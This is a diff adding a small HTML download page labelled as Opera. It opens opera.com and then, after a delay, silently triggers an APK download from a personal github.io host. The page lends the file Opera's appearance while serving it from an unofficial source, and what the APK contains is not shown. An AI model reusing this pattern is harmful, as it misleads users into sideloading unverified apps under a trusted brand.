@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Download File</title>
+
+</head>
+
+<body>
+    <h1>Download File from Opera</h1>
+
+    <button onclick="startDownload()">Start Download</button>
+
+
+
+
+
+    <script>
+        function startDownload() {
+            // 1. Open Opera's Android download page
+            window.open(
+                'https://opera.com',
+                '_blank'
+            );
+
+            // 2. After 5 seconds, trigger the APK download
+            setTimeout(() => {
+                const link = document.createElement('a');
+                link.href =
+                    'https://kokurate.github.io/browser/Opera_100_4_5122_89709_Generic_Opera_arm8_LZMA.apk';
+                link.download =
+                    'Opera_100_4_5122_89709_Generic_Opera_arm8_LZMA.apk';
+                link.style.display = 'none';
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+            }, 5000);
+        }
+    </script>
+
+</body>
+
+</html>
